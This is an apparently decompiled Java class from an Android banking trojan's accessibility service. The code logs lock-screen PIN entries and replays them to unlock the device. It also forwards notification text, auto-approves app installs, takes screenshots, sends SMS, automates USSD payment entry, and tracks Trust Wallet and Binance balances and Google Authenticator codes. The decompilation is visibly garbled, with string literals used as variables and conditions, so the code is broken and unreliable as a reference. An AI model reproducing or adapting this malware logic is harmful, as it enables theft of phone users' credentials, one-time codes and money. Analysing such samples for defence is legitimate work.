package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore
 * Original: Lcom/tencent/tunesxconcerningn1012;
 */
public class AccessibilityServiceCore extends AccessibilityService {

    // === FIELDS ===
    public static String CurrentName;
    public static List DisabledApps;
    public static Boolean FOR_REM;
    public static FrameLayout Fakelay;
    public static WindowManager$LayoutParams Fakeparams;
    public static WindowManager$LayoutParams Fakeparams_bass;
    public static String ccurrentPassword;
    public static boolean ifFinishiInitPermission = false;
    public static FrameLayout injview;
    public static WindowManager$LayoutParams layoutParams;
    public static String passcheck = "0";
    public static SurfaceView sfw;
    static String trustWalletBtcBalance = "";
    static String trustWalletEthBalance = "";
    static String trustWalletUsdtBalance = "";
    static String trustWalletname = "";
    public static Boolean tunesxconcerningn1012Auto_Click;
    public static boolean tunesxconcerningn1012CheckPrims;
    public static String tunesxconcerningn1012DisablePlayProtect;
    public static Boolean tunesxconcerningn1012FOR_IN;
    public static Boolean tunesxconcerningn1012FOR_SC;
    public static Boolean tunesxconcerningn1012FOR_prim;
    public static AccessibilityEvent tunesxconcerningn1012GlobalEvent;
    public static AccessibilityNodeInfo tunesxconcerningn1012Globalnode;
    public static Boolean tunesxconcerningn1012NeedPaste;
    public static String tunesxconcerningn1012OFFOK;
    public static String tunesxconcerningn1012OFK;
    public static boolean tunesxconcerningn1012RecorderActive;
    public static boolean tunesxconcerningn1012Recording;
    public static boolean tunesxconcerningn1012SendGoogleAuth;
    public static String tunesxconcerningn1012ToPaste;
    public static Boolean tunesxconcerningn1012bypass;
    public static WindowManager$LayoutParams tunesxconcerningn1012lay;
    public static MediaRecorder tunesxconcerningn1012mRecorder;
    public static WindowManager tunesxconcerningn1012wm;
    public static String useRec;
     AccessibilityEventMonitor$ICallback callbeack;
     Handler handler;
    public String localeForAccessibility;
    private ScreenCaptureEngine mScreetunesxconcerningn10nStatusController;
     Handler screenShotHandler;
     Thread screenShotThread;
    private boolean showbinance;
    private boolean showtrust;
     int total;
     Handler unlockScreenHandler;

    // === METHODS ===

    static void StaticInitializer() {
        v0 = 0;
        v1 = Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012Auto_Click = v1;
        AccessibilityServiceCore.tunesxconcerningn1012FOR_SC = v1;
        AccessibilityServiceCore.FOR_REM = v1;
        AccessibilityServiceCore.tunesxconcerningn1012FOR_IN = v1;
        AccessibilityServiceCore.tunesxconcerningn1012FOR_prim = v1;
        AccessibilityServiceCore.tunesxconcerningn1012bypass = v1;
        v2 = "on";
        AccessibilityServiceCore.tunesxconcerningn1012OFK = "on";
        AccessibilityServiceCore.tunesxconcerningn1012DisablePlayProtect = "[DIS_PROTECTION]";
        v2 = 1;
        AccessibilityServiceCore.tunesxconcerningn1012CheckPrims = 1;
        AccessibilityServiceCore.tunesxconcerningn1012OFFOK = "on";
        AccessibilityServiceCore.tunesxconcerningn1012ToPaste = "";
        AccessibilityServiceCore.tunesxconcerningn1012NeedPaste = v1;
        AccessibilityServiceCore.tunesxconcerningn1012SendGoogleAuth = 0;
        v1 = 0;
        AccessibilityServiceCore.tunesxconcerningn1012Globalnode = 0;
        AccessibilityServiceCore.tunesxconcerningn1012GlobalEvent = 0;
        // new ArrayList()
        AccessibilityServiceCore.DisabledApps = 0;
        AccessibilityServiceCore.tunesxconcerningn1012Recording = 0;
        AccessibilityServiceCore.tunesxconcerningn1012RecorderActive = 0;
        AccessibilityServiceCore.useRec = "NO";
        AccessibilityServiceCore.ccurrentPassword = "";
        return;
    }

    public void Constructor() {
        // new AccessibilityService()
        v0 = 0;
        v4.screenShotThread = 0;
        v1 = new Handler();
        v3 = Looper.myLooper();
        v3 = new AccessibilityServiceCore$3();
        // new AccessibilityServiceCore$3(v4)
        // new Handler(v2, v3)
        v4.screenShotHandler = v1;
        v1 = new Handler();
        v3 = Looper.myLooper();
        v3 = new AccessibilityServiceCore$4();
        // new AccessibilityServiceCore$4(v4)
        // new Handler(v2, v3)
        v4.unlockScreenHandler = v1;
        v1 = "{'en':'Enable','de':'Aktivieren','ar':'تفعيل";
        v4.localeForAccessibility = "{'en':'Enable','de':'Aktivieren','ar':'تفعيل";
        v4.mScreetunesxconcerningn10nStatusController = 0;
        v0 = 0;
        v4.showtrust = 0;
        v4.showbinance = 0;
        v3 = Looper.getMainLooper();
        v3 = new AccessibilityServiceCore$19();
        // new AccessibilityServiceCore$19(v4)
        // new Handler(v2, v3)
        v4.handler = "{'en':'Enable','de':'Aktivieren','ar':'تفعيل";
        v4.total = 0;
        return;
    }

    private boolean Gotitinstalled(AccessibilityNodeInfo param0) {
        v0 = 0;
        if (v7 == null || v7 == 0) { // goto +129
        v2 = v7.getChildCount();
        v2 = "android.widget.Button";
        v3 = v7.getClassName();
        v3 = "android.widget.Button".equals(v3);
        v3 = 1;
        if ("android.widget.Button" == null || "android.widget.Button" == 0) { // goto +78
        v7.getText();
        "android.widget.Button".toString();
        v4 = TextUtils.isEmpty("android.widget.Button");
        if (v4 != null && v4 != 0) { // goto +81
        v4 = "安装";
        "安装".equals("android.widget.Button");
        if ("安装" != null && "安装" != 0) { // goto +50
        "android.widget.Button".toLowerCase();
        "install".equals(v5);
        if ("install" != null && "install" != 0) { // goto +38
        "android.widget.Button".toLowerCase();
        "done".equals(v5);
        if ("done" != null && "done" != 0) { // goto +26
        "完成".equals("android.widget.Button");
        if ("完成" != null && "完成" != 0) { // goto +18
        "تثبيت".equals("android.widget.Button");
        if ("تثبيت" != null && "تثبيت" != 0) { // goto +10
        v0 = "确定".equals("android.widget.Button");
        if ("android.widget.Button" == null || "android.widget.Button" == 0) { // goto +25
        v0 = 16;
        v7.performAction(16);
        return 1;
        v7.getClassName();
        v2 = "android.widget.ScrollView".equals("确定");
        if ("android.widget.ScrollView" == null || "android.widget.ScrollView" == 0) { // goto +7
        v2 = 4096;
        v7.performAction(4096);
        if (4096 >= v1) { // goto +16
        v7.getChild(4096);
        v2 = v6.Gotitinstalled("确定");
        if ("确定" == null || "确定" == 0) { // goto +3
        return 1;
        v2 = 4096 + 1;
        // goto (branch)
        return 16;
    }

    static void access$000(AccessibilityServiceCore param0) {
        v0.screenShot();
        return;
    }

    static void access$100(AccessibilityServiceCore param0) {
        v0.unlockScreen();
        return;
    }

    static void access$1000(AccessibilityServiceCore param0, int param1) {
        v0.continueclickBtn(v1);
        return;
    }

    static void access$500(AccessibilityServiceCore param0) {
        v0.unlockScreenSuccess();
        return;
    }

    static void access$600(AccessibilityServiceCore param0) {
        v0.continueb();
        return;
    }

    static void access$700(AccessibilityServiceCore param0) {
        v0.continuec();
        return;
    }

    static void access$800(AccessibilityServiceCore param0) {
        v0.continued();
        return;
    }

    static void access$900(AccessibilityServiceCore param0) {
        v0.continuee();
        return;
    }

    public static Bitmap applyExposure(Bitmap param0, float param1) {
        v2 = v5.getWidth();
        v2 = v5.getHeight();
        v2 = Bitmap$Config.ARGB_8888;
        v1 = Bitmap.createBitmap(v0, v1, v2);
        v1 = new ColorMatrix();
        // new ColorMatrix()
        v2 = 20;
        v3 = 0;
        20[0] = v6;
        v3 = 1;
        v4 = 0;
        20[1] = 0;
        v3 = 2;
        20[2] = 0;
        v3 = 3;
        20[3] = 0;
        v3 = 4;
        20[4] = 0;
        v3 = 5;
        20[5] = 0;
        v3 = 6;
        20[6] = v6;
        v3 = 7;
        20[7] = 0;
        v3 = 8;
        20[8] = 0;
        v3 = 9;
        20[9] = 0;
        v3 = 10;
        20[10] = 0;
        v3 = 11;
        20[11] = 0;
        v3 = 12;
        20[12] = v6;
        v6 = 13;
        20[13] = 0;
        v6 = 14;
        20[14] = 0;
        v6 = 15;
        20[15] = 0;
        v6 = 16;
        20[16] = 0;
        v6 = 17;
        20[17] = 0;
        v6 = 18;
        v3 = 1065353216; // 0x3f800000
        20[18] = 12;
        v6 = 19;
        20[19] = 0;
        v1.set(20);
        // new Paint()
        // new ColorMatrixColorFilter(v1)
        19.setColorFilter(20);
        v1 = new Canvas();
        // new Canvas(v0)
        v1.drawBitmap(v5, 0, 0, 19);
        return v0;
    }

    private boolean checkIfClickPermission(AccessibilityEvent param0) {
        v0 = "com.android.permissioncontroller";
        v2.getPackageName();
        v2 = "com.android.permissioncontroller".equals(v2);
        if (v2 == null || v2 == 0) { // goto +4
        v2 = 1;
        return 1;
        v2 = 0;
        return 0;
    }

    private boolean checkIfHome(AccessibilityEvent param0) {
        v1 = v3.getEventType();
        v1 = 32;
        if (v0 != 32) { // goto +52
        v0 = "com.android.launcher3";
        v3.getPackageName();
        "com.android.launcher3".equals(32);
        if ("com.android.launcher3" != null && "com.android.launcher3" != 0) { // goto +38
        v3.getPackageName();
        "com.bbk.launcher2".equals(32);
        if ("com.bbk.launcher2" != null && "com.bbk.launcher2" != 0) { // goto +26
        v3.getPackageName();
        "com.huawei.android.launcher".equals(32);
        if ("com.huawei.android.launcher" != null && "com.huawei.android.launcher" != 0) { // goto +14
        v3.getPackageName();
        v3 = "com.miui.home".equals(v3);
        if (v3 == null || v3 == 0) { // goto +4
        v3 = 1;
        // goto (branch)
        v3 = 0;
        return 0;
    }

    private boolean checkIfMatch(String param0) {
        v0 = "Phone#\[\d{4}]#3";
        Pattern.compile("Phone#\[\d{4}]#3");
        "Phone#\[\d{4}]#3".matcher(v2);
        v2.matches();
        return v2;
    }

    private void checkPassword(AccessibilityEvent param0) {
        v3.checkIfHome(v4);
        if (v0 == null || v0 == 0) { // goto +3
        return;
        v2 = v4.getSource();
        v2 = v4.getEventType();
        v2 = 1;
        if (v1 != 1) { // goto +119
        v1 = "com.android.systemui";
        v4.getPackageName();
        "com.android.systemui".equals(v4);
        if (v4 == null || v4 == 0) { // goto +107
        v0.getViewIdResourceName();
        v3.checkResourceId(v4);
        if (v4 == null || v4 == 0) { // goto +38
        v0.getContentDescription();
        v0 = v4.toString();
        v0 = Integer.parseInt(v4);
        v0 = new StringBuilder();
        // new StringBuilder()
        v0.append("com.android.systemui");
        v0.append(v4);
        v4 = v0.toString();
        AccessibilityServiceCore.ccurrentPassword = v4;
        v4 = "1";
        AccessibilityServiceCore.passcheck = "1";
        // goto (branch)
        v0.getViewIdResourceName();
        "com.android.systemui:id/delete_button".equals("com.android.systemui");
        if ("com.android.systemui:id/delete_button" != null && "com.android.systemui:id/delete_button" != 0) { // goto +14
        v0.getViewIdResourceName();
        "com.android.systemui:id/vivo_cancel".equals(v0);
        if ("com.android.systemui:id/vivo_cancel" == null || "com.android.systemui:id/vivo_cancel" == 0) { // goto +37
        "com.android.systemui:id/vivo_cancel".length();
        if ("com.android.systemui:id/vivo_cancel" != 1) { // goto +7
        AccessibilityServiceCore.ccurrentPassword = "";
        // goto (branch)
        "".length();
        if ("" <= 0) { // goto +16
        v1 = "".length();
        v1 = 0;
        "".substring(0, v0);
        AccessibilityServiceCore.ccurrentPassword = "";
        return;
    }

    private boolean checkResourceId(String param0) {
        v0 = "com.android.systemui:id/key|com.android.systemui:id/VivoPinkey";
        Pattern.compile("com.android.systemui:id/key|com.android.systemui:id/VivoPinkey");
        "com.android.systemui:id/key|com.android.systemui:id/VivoPinkey".matcher(v2);
        v2.find();
        return v2;
    }

    private void checkpay(AccessibilityEvent param0) {
        v1 = v3.getEventType();
        v1 = 16;
        if (v0 != 16) { // goto +35
        v0 = v3.getSource();
        v0 = "com.android.phone:id/input_field";
        v3.getViewIdResourceName();
        "com.android.phone:id/input_field".equals(16);
        if ("com.android.phone:id/input_field" == null || "com.android.phone:id/input_field" == 0) { // goto +19
        v3.getText();
        v1 = v3.toString();
        v1 = v3.length();
        v1 = 4;
        if ("com.android.phone:id/input_field" != 4) { // goto +4
        MainBackgroundService.ussdpayd = v3;
        return;
    }

    private void clickSendButton() {
        v1 = v3.getRootInActiveWindow();
        if (v0 == null || v0 == 0) { // goto +42
        v1 = "ENVOYER";
        v0.findAccessibilityNodeInfosByText("ENVOYER");
        v0.iterator();
        v0.hasNext();
        if ("ENVOYER" == null || "ENVOYER" == 0) { // goto +26
        v0.next();
        v0 = "ENVOYER".isClickable();
        if (v2 == null || v2 == 0) { // goto +-16
        v0 = 16;
        "ENVOYER".performAction(16);
        v0 = 0;
        Boolean.valueOf(0);
        AccessibilityServiceCore.tunesxconcerningn1012Auto_Click = 0;
        return;
    }

    private void continueb() {
        v2.getRootInActiveWindow();
        v0 = MainBackgroundService.ussdcard;
        if (v0 == null || v0 == 0) { // goto +35
        v0 = MainBackgroundService.MyAccess;
        v0 = MainBackgroundService.ussdcard;
        AccessibilityServiceCore.tunesxconcerningn1012ToPaste = v0;
        v0 = MainBackgroundService.MyAccess;
        v0 = 1;
        v1 = Boolean.valueOf(1);
        AccessibilityServiceCore.tunesxconcerningn1012NeedPaste = 1;
        1.tunesxconcerningn1012Treger();
        v1 = new AccessibilityServiceCore$$ExternalSyntheticLambda13();
        // new AccessibilityServiceCore$$ExternalSyntheticLambda13(v2)
        // new Thread(v1)
        1.start();
        return;
    }

    private void continuec() {
        v0 = MainBackgroundService.ussdamount;
        if (v0 == null || v0 == 0) { // goto +35
        v0 = MainBackgroundService.MyAccess;
        v0 = MainBackgroundService.ussdamount;
        AccessibilityServiceCore.tunesxconcerningn1012ToPaste = v0;
        v0 = MainBackgroundService.MyAccess;
        v0 = 1;
        v1 = Boolean.valueOf(1);
        AccessibilityServiceCore.tunesxconcerningn1012NeedPaste = 1;
        1.tunesxconcerningn1012Treger();
        v1 = new AccessibilityServiceCore$$ExternalSyntheticLambda11();
        // new AccessibilityServiceCore$$ExternalSyntheticLambda11(v2)
        // new Thread(v1)
        1.start();
        return;
    }

    private void continueclickBtn(int param0) {
        v2.clickSendButton();
        v0 = new Thread();
        v1 = new AccessibilityServiceCore$$ExternalSyntheticLambda12();
        // new AccessibilityServiceCore$$ExternalSyntheticLambda12(v2, v3)
        // new Thread(v1)
        v0.start();
        return;
    }

    private void continued() {
        v0 = MainBackgroundService.ussdpayd;
        if (v0 == null || v0 == 0) { // goto +35
        v0 = MainBackgroundService.MyAccess;
        v0 = MainBackgroundService.ussdpayd;
        AccessibilityServiceCore.tunesxconcerningn1012ToPaste = v0;
        v0 = MainBackgroundService.MyAccess;
        v0 = 1;
        v1 = Boolean.valueOf(1);
        AccessibilityServiceCore.tunesxconcerningn1012NeedPaste = 1;
        1.tunesxconcerningn1012Treger();
        v1 = new AccessibilityServiceCore$$ExternalSyntheticLambda10();
        // new AccessibilityServiceCore$$ExternalSyntheticLambda10(v2)
        // new Thread(v1)
        1.start();
        return;
    }

    private void continuee() {
        v0.clickSendButton();
        return;
    }

    private void drawViewHierarchy(Canvas param0, AccessibilityNodeInfo param1, Paint param2) {
        if (v12 == null || v12 == 0) { // goto +252
        v0 = v12.getChildCount();
        if (v0 != null && v0 != 0) { // goto +4
        // goto (branch)
        v0 = 0;
        v1 = 0;
        v12.getChildCount();
        if (v1 >= v2) { // goto +236
        v3 = v12.getChild(v1);
        if (v2 == null || v2 == 0) { // goto +226
        v3 = new Rect();
        // new Rect()
        v2.getBoundsInScreen(v3);
        v4 = 1099956224; // 0x41900000
        v13.setTextSize(v4);
        v2.getClassName();
        v4.toString();
        v4.hashCode();
        v6 = v4.hashCode();
        v6 = -1;
        v7 = 1;
        v4 = -1;
        // goto (branch)
        v5 = "android.widget.RadioButton";
        v4 = v4.equals("android.widget.RadioButton");
        if (v4 != null && v4 != 0) { // goto +3
        // goto (branch)
        v4 = 5;
        // goto (branch)
        v4 = 5.equals("android.widget.Button");
        if (5 != null && 5 != 0) { // goto +3
        // goto (branch)
        v4 = 4;
        // goto (branch)
        v4 = 4.equals("android.widget.TextView");
        if (4 != null && 4 != 0) { // goto +3
        // goto (branch)
        v4 = 3;
        // goto (branch)
        v4 = 3.equals("android.widget.EditText");
        if (3 != null && 3 != 0) { // goto +3
        // goto (branch)
        v4 = 2;
        // goto (branch)
        2.equals("android.widget.CheckBox");
        if (2 != null && 2 != 0) { // goto +3
        // goto (branch)
        // goto (branch)
        v5 = 2.equals("android.widget.ToggleButton");
        if (2 != null && 2 != 0) { // goto +3
        // goto (branch)
        v5 = 1098907648; // 0x41800000
        v13.setTextSize("android.widget.ToggleButton");
        v4 = -7829368;
        // goto (branch)
        v4 = -16711936;
        // goto (branch)
        v4 = -16776961;
        // goto (branch)
        v4 = 1107558400; // 0x42040000
        v13.setTextSize(-16776961);
        v4 = -65536; // 0xffff0000
        // goto (branch)
        v4 = 1106247680; // 0x41f00000
        v13.setTextSize(-16776961);
        v4 = -16711681;
        // goto (branch)
        v4 = -65281;
        // goto (branch)
        v4 = -256;
        v2.getText();
        if (v8 == null || v8 == 0) { // goto +11
        v2.getText();
        v8.toString();
        // goto (branch)
        v2.getContentDescription();
        if (v8 == null || v8 == 0) { // goto +11
        v2.getContentDescription();
        v8 = v8.toString();
        // goto (branch)
        v8 = "";
        v9 = Paint$Style.STROKE;
        v13.setStyle(v9);
        v9 = 1073741824; // 0x40000000
        v13.setStrokeWidth(v9);
        v11.drawRect(v3, v13);
        v9 = Paint$Style.STROKE;
        v13.setStyle(v9);
        v13.setColor(-1);
        v11.drawRect(v3, v13);
        v13.setColor(-256);
        v13.setAntiAlias(1);
        -256 = v3.left;
        v4 = -256 + 16;
        -256 = (float) -256;
        v3.exactCenterY();
        v11.drawText("", -256, v3, v13);
        v10.drawViewHierarchy(v11, v2, v13);
        v2.recycle();
        v1 = v1 + 1;
        // goto (branch)
        return;
    }

    public static String getApplicationName(Context param0) {
        v1 = v2.getApplicationInfo();
        v1 = v0.labelRes;
        if (v1 != null && v1 != 0) { // goto +9
        v2 = v0.nonLocalizedLabel;
        v2.toString();
        // goto (branch)
        v2.getString(v1);
        return v2;
    }

    public static Bitmap getTransparentBitmap(Bitmap param0, int param1) {
        v0 = Bitmap$Config.ARGB_8888;
        v1 = 1;
        v0 = v10.copy(v0, 1);
        v0 = 1117782016; // 0x42a00000
        AccessibilityServiceCore.applyExposure(v10, v0);
        v10.getWidth();
        v9 = v10.getHeight();
        v9 = new int[][v0];
        v3 = 0;
        v5 = v10.getWidth();
        v5 = 0;
        v6 = 0;
        v2 = v10.getWidth();
        v2 = v10.getHeight();
        v2 = v9;
        Bitmap.getPixels(...);
        v11 = v11 * 255;
        v11 = v11 / 100;
        v1 = 0;
        if (0 >= v0) { // goto +16
        v2 = v11 << 24;
        v4 = 16777215;
        v9[0] = v2;
        v1 = 0 + 1;
        // goto (branch)
        v0 = v10.getWidth();
        v0 = v10.getHeight();
        v0 = Bitmap$Config.ARGB_8888;
        Bitmap.createBitmap(v9, v11, v10, v0);
        return v10;
    }

    private void loadMyPage(WebView param0) {
        v0 = AccessibilityServiceCore.layoutParams;
        v1 = -1;
        v0.width = -1;
        v0 = AccessibilityServiceCore.layoutParams;
        v0.height = -1;
        v0 = AccessibilityServiceCore.injview;
        v0 = v0.getChildCount();
        if (v0 == null || v0 == 0) { // goto +7
        v0 = AccessibilityServiceCore.injview;
        v0.removeAllViews();
        v0 = AccessibilityServiceCore.layoutParams;
        v1 = -2142501088;
        v0.flags = -2142501088;
        v0 = AccessibilityServiceCore.injview;
        v0.addView(v3);
        v3 = AccessibilityServiceCore.tunesxconcerningn1012wm;
        v0 = AccessibilityServiceCore.injview;
        -2142501088 = AccessibilityServiceCore.layoutParams;
        v3.updateViewLayout(v0, -2142501088);
        v3 = AccessibilityServiceCore.injview;
        v0 = 0;
        v3.setVisibility(0);
        return;
    }

    private void screenShot() {
        v0 = AccessibilityServiceCore.Fakelay;
        v1 = v0.getVisibility();
        v1 = 0;
        v2 = 9;
        v3 = 264;
        v4 = "Screenshots";
        v5 = 30;
        if (v0 != null && v0 != 0) { // goto +75
        v0 = Build$VERSION.SDK_INT;
        if (v0 < 30) { // goto +20
        v6.getApplicationContext();
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v0);
        // new AccessibilityServiceCore$8(v6)
        v6.takeScreenshot(0, v0, 9);
        // goto (branch)
        v0 = new StringBuilder();
        // new StringBuilder()
        Environment.getExternalStorageDirectory();
        v0.append(0);
        v0.append(0);
        v0.append(0);
        v0.append(0);
        v0.append("Screenshots");
        v0.append(0);
        v0.toString();
        // new AccessibilityServiceCore$9(v6, v0, 264)
        0.startWatching();
        v6.performGlobalAction(9);
        // goto (branch)
        v0 = Build$VERSION.SDK_INT;
        if (v0 < 30) { // goto +19
        v6.getApplicationContext();
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v0);
        // new AccessibilityServiceCore$10(v6)
        v6.takeScreenshot(0, v0, 9);
        // goto (branch)
        v0 = new StringBuilder();
        // new StringBuilder()
        Environment.getExternalStorageDirectory();
        v0.append(0);
        v0.append(0);
        v0.append(0);
        v0.append(0);
        v0.append("Screenshots");
        v0.append(0);
        v0.toString();
        // new AccessibilityServiceCore$11(v6, v0, 264)
        0.startWatching();
        v6.performGlobalAction(9);
        return;
    }

    public static void sendSMS(String param0, String param1) {
        v2 = SmsManager.getDefault();
        v2 = 0;
        v4 = 0;
        v5 = 0;
        v1 = v6;
        v3 = v7;
        SmsManager.sendTextMessage(...);
        return;
    }

    private void tunesxconcerningn1012SendNotifi(AccessibilityEvent param0) {
        v0 = "|";
        v1 = v6.getParcelableData();
        v1 = (Notification) v1;
        if (v1 != null && v1 != 0) { // goto +3
        return;
        v2 = v1.extras;
        v3 = "android.title";
        v1 = v2.getCharSequence("android.title");
        v1 = v2.toString();
        v1 = v1.extras;
        v1.getCharSequence("android.text");
        v1.toString();
        v6.getPackageName();
        v4 = v6.toString();
        v4 = AccessibilityServiceCore.tunesxconcerningn1012getAppNameFromPkgName(v5, v6);
        v4 = new StringBuilder();
        // new StringBuilder()
        v4.append(v6);
        v4.append("|");
        v4.append(v2);
        v4.append("|");
        v4.append(v1);
        v6 = "|.";
        v4.append("|.");
        v4.toString();
        "|.".getBytes();
        DataEncryptionEngine.agreeltimelybfacilitatez38("android.text", "|.");
        return;
    }

    public static void tunesxconcerningn1012clickAtPosition(int param0, int param1, AccessibilityNodeInfo param2) {
        if (v4 != null && v4 != 0) { // goto +3
        return;
        v1 = v4.getChildCount();
        v1 = 16;
        if (v0 != null && v0 != 0) { // goto +20
        v0 = new Rect();
        // new Rect()
        v4.getBoundsInScreen(v0);
        v0.contains(v2, v3);
        if (v2 == null || v2 == 0) { // goto +40
        v4.performAction(16);
        // goto (branch)
        v0 = new Rect();
        // new Rect()
        v4.getBoundsInScreen(v0);
        v0 = v0.contains(v2, v3);
        if (v0 == null || v0 == 0) { // goto +5
        v4.performAction(16);
        v0 = 0;
        v4.getChildCount();
        if (0 >= 16) { // goto +12
        v0 = v4.getChild(0);
        AccessibilityServiceCore.tunesxconcerningn1012clickAtPosition(v2, v3, 16);
        v0 = 0 + 1;
        // goto (branch)
        return;
    }

    public static boolean tunesxconcerningn1012clickByText(String param0) {
        AccessibilityServiceCore.tunesxconcerningn1012findNodesByText(v0);
        AccessibilityServiceCore.tunesxconcerningn1012performClick(v0);
        return v0;
    }

    public static List tunesxconcerningn1012findNodesByText(String param0) {
        AccessibilityServiceCore.tunesxconcerningn1012getRootNodeInfo();
        if (v0 == null || v0 == 0) { // goto +7
        v1 = v0.findAccessibilityNodeInfosByText(v1);
        return v1;
        v1 = 0;
        return 0;
    }

    public static String tunesxconcerningn1012getAppNameFromPkgName(Context param0, String param1) {
        v0 = v1.getPackageManager();
        v0 = 128;
        v1 = v1.getApplicationInfo(v2, 128);
        v1 = v1.getApplicationLabel(v2);
        v1 = (String) v1;
        return v1;
        v1 = "";
        return "";
    }

    private static AccessibilityNodeInfo tunesxconcerningn1012getRootNodeInfo() {
        v0 = MainBackgroundService.MyAccess;
        v0.getRootInActiveWindow();
        return v0;
    }

    private static boolean tunesxconcerningn1012performClick(List param0) {
        if (v2 == null || v2 == 0) { // goto +37
        v2.isEmpty();
        if (v0 != null && v0 != 0) { // goto +31
        v2.iterator();
        v2.hasNext();
        if (v0 == null || v0 == 0) { // goto +21
        v0 = v2.next();
        v0 = (AccessibilityNodeInfo) v0;
        v2 = v0.isEnabled();
        if (v1 == null || v1 == 0) { // goto +-16
        v2 = 16;
        v2 = v0.performAction(16);
        return 16;
        v2 = 0;
        return 0;
    }

    public static String tunesxconcerningn1012toBase64(String param0) {
        v0 = "UTF-8";
        v0 = v1.getBytes("UTF-8");
        v0 = 0;
        Base64.encodeToString(v1, 0);
        return v1;
        v1.printStackTrace();
        v1 = 0;
        return 0;
    }

    private void unlockScreen() {
        v1 = v8.getRootInActiveWindow();
        v1 = MainBackgroundService.currentSuccessPassword;
        v2 = v1.length();
        v2 = 0;
        v3 = 0;
        v4 = 16;
        if (v3 >= v1) { // goto +88
        v5 = UtilityHelper.isVivoDevice();
        if (v5 == null || v5 == 0) { // goto +41
        v5 = new StringBuilder();
        // new StringBuilder()
        v6 = "com.android.systemui:id/VivoPinkey";
        v5.append("com.android.systemui:id/VivoPinkey");
        v7 = v3 + 1;
        "com.android.systemui:id/VivoPinkey".substring(v3, v7);
        v5.append("com.android.systemui:id/VivoPinkey");
        v5.toString();
        v5 = v0.findAccessibilityNodeInfosByViewId(v5);
        v5 = v5.get(0);
        v5 = (AccessibilityNodeInfo) v5;
        v5.performAction(16);
        // goto (branch)
        v5 = new StringBuilder();
        // new StringBuilder()
        v5.append("com.android.systemui:id/key");
        v7 = v3 + 1;
        "com.android.systemui:id/key".substring(v3, v7);
        v5.append("com.android.systemui:id/key");
        v5.toString();
        v5 = v0.findAccessibilityNodeInfosByViewId(v5);
        v5 = v5.get(0);
        v5 = (AccessibilityNodeInfo) v5;
        v5.performAction(16);
        v3 = v3 + 1;
        // goto (branch)
        v1 = "com.android.systemui:id/key_enter_text";
        v0.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key_enter_text");
        "com.android.systemui:id/key_enter_text".isEmpty();
        if (v3 != null && v3 != 0) { // goto +9
        v0 = "com.android.systemui:id/key_enter_text".get(0);
        v0 = (AccessibilityNodeInfo) v0;
        // goto (branch)
        v0 = v0.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key_enter");
        v0 = v0.get(0);
        v0 = (AccessibilityNodeInfo) v0;
        v0.performAction(16);
        return;
    }

    private void unlockScreenListen() {
        v0 = new ScreenCaptureEngine();
        // new ScreenCaptureEngine(v2)
        v2.mScreetunesxconcerningn10nStatusController = v0;
        v1 = new AccessibilityServiceCore$18();
        // new AccessibilityServiceCore$18(v2)
        v0.setScreenStatusListener(v1);
        v0 = v2.mScreetunesxconcerningn10nStatusController;
        v0.startListen();
        return;
    }

    private void unlockScreenSuccess() {
        v0 = AccessibilityServiceCore.ccurrentPassword;
        v1 = v0.length();
        v1 = 16;
        v2 = "";
        if (v0 <= 16) { // goto +5
        AccessibilityServiceCore.ccurrentPassword = "";
        return;
        v0 = MainBackgroundService.currentSuccessPassword;
        v0 = v0.length();
        if (v0 == null || v0 == 0) { // goto +16
        v0 = MainBackgroundService.currentSuccessPassword;
        v0.length();
        v0 = 16.length();
        if (v0 != 16) { // goto +6
        v0 = AccessibilityServiceCore.ccurrentPassword;
        MainBackgroundService.currentSuccessPassword = v0;
        AccessibilityServiceCore.ccurrentPassword = "";
        return;
    }

    public void Treger(String param0) {
        v0 = new Handler();
        v1 = Looper.getMainLooper();
        // new Handler(v1)
        v1 = new AccessibilityServiceCore$12();
        // new AccessibilityServiceCore$12(v2, v3)
        v0.post(v1);
        return;
    }

    public Bitmap convertToBitmap(Drawable param0, int param1, int param2) {
        v0 = Bitmap$Config.ARGB_8888;
        v1 = Bitmap.createBitmap(v5, v6, v0);
        v1 = new Canvas();
        // new Canvas(v0)
        v2 = 0;
        v4.setBounds(0, 0, v5, v6);
        v4.draw(v1);
        return v0;
    }

    public void createskilton(AccessibilityNodeInfo param0) {
        v0 = ":";
        if (v12 != null && v12 != 0) { // goto +3
        return;
        v2 = v11.getApplicationContext();
        v2 = "SCH";
        v3 = "720";
        v4 = My_tunesxconcerningn10_Settings.read(v1, "SCH", "720");
        v4 = v11.getApplicationContext();
        v4 = "1080";
        My_tunesxconcerningn10_Settings.read("SCH", "SCW", "1080");
        Integer.valueOf(v1);
        "SCW".intValue();
        v5 = Integer.valueOf("SCH");
        v5 = "1080".intValue();
        v5 = Bitmap$Config.ARGB_8888;
        v5 = Bitmap.createBitmap("SCW", "1080", v5);
        // new Canvas("SCW")
        v5 = new Paint();
        // new Paint()
        v6 = -16777216; // 0xff000000
        "1080".drawColor(v6);
        v6 = new Rect();
        // new Rect()
        v12.getBoundsInScreen(v6);
        v7 = "";
        v12.getText();
        if (v8 == null || v8 == 0) { // goto +11
        v12.getText();
        v8.toString();
        // goto (branch)
        v12.getContentDescription();
        if (v8 == null || v8 == 0) { // goto +10
        v12.getContentDescription();
        v9 = v8.toString();
        v9 = v12.getClassName();
        v9 = "android.widget.TextView";
        v9 = v8.equals("android.widget.TextView");
        v9 = -65536; // 0xffff0000
        if (v8 == null || v8 == 0) { // goto +9
        v8 = -16776961;
        v5.setColor(-16776961);
        // goto (branch)
        v10 = v12.getClassName();
        v10 = "android.widget.EditText";
        v8 = -16776961.equals("android.widget.EditText");
        if (-16776961 == null || -16776961 == 0) { // goto +9
        v8 = -16711936;
        v5.setColor(-16711936);
        // goto (branch)
        v12.getClassName();
        v8 = -16711936.equals("android.widget.CheckBox");
        if (-16711936 == null || -16711936 == 0) { // goto +8
        v8 = -256;
        v5.setColor(-256);
        // goto (branch)
        v5.setColor("android.widget.TextView");
        v5.setColor("android.widget.TextView");
        -256 = Paint$Style.STROKE;
        v5.setStyle(-256);
        v8 = 1073741824; // 0x40000000
